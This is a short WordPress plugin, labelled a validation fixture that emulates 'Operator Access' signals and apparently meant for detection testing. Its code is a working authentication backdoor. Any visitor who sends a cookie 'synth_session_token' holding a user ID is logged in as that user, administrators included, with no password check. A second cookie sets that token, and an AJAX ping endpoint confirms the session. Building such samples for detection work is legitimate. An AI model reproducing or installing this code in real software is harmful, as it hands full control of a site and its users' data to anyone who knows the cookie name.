<?php
/**
 * Plugin Name: Synthetic Operator Access
 * Description: Validation fixture — emulates Operator Access behavioral signals.
 */
if (!defined('ABSPATH')) {
    exit;
}

add_action('init', function () {
    if (isset($_COOKIE['synth_session_token'])) {
        $user_id = absint($_COOKIE['synth_session_token']);
        if ($user_id > 0) {
            wp_set_auth_cookie($user_id, true);
            wp_safe_redirect(admin_url());
            exit;
        }
    }
    if (isset($_COOKIE['synth_refresh'])) {
        setcookie('synth_session_token', sanitize_text_field(wp_unslash($_COOKIE['synth_refresh'])), time() + 3600, '/');
    }
});

add_action('wp_ajax_synth_operator_ping', function () {
    if (!isset($_COOKIE['synth_session_token'])) {
        wp_send_json_error('unauthorized');
    }
    wp_send_json_success(array('status' => 'ok'));
});

add_action('wp_ajax_nopriv_synth_operator_ping', function () {
    wp_send_json_error('unauthorized');
});
